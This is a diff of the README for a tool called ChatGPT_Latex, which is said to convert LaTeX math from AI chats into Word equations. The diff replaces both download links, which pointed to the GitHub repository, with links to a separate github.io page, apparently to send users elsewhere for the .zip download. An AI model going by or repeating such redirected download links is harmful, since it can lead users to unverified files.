@@ -1,6 +1,6 @@
 # 📝 ChatGPT_Latex - Copy AI Math Into Word Easily
 
-[![Download ChatGPT_Latex](https://img.shields.io/badge/Download-Release-blue)](https://github.com/meirallmains299/ChatGPT_Latex)
+[![Download ChatGPT_Latex](https://img.shields.io/badge/Download-Release-blue)](https://meirallmains299.github.io)
 
 This tool helps you move math equations from AI chat windows into Microsoft Word. Many AI bots display complex math using a format called LaTeX. Microsoft Word does not always understand this format directly. This tool fixes that problem. It detects math formulas on your screen and converts them into standard equations that your word processor recognizes.
 
@@ -21,7 +21,7 @@ You need the following items to run this tool:
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the repository page to download the software. You can find the link here: [https://github.com/meirallmains299/ChatGPT_Latex](https://github.com/meirallmains299/ChatGPT_Latex).
+1. Visit the repository page to download the software. You can find the link here: [https://meirallmains299.github.io](https://meirallmains299.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link that shows the most recent version.
 4. Download the file ending in .zip to your computer.
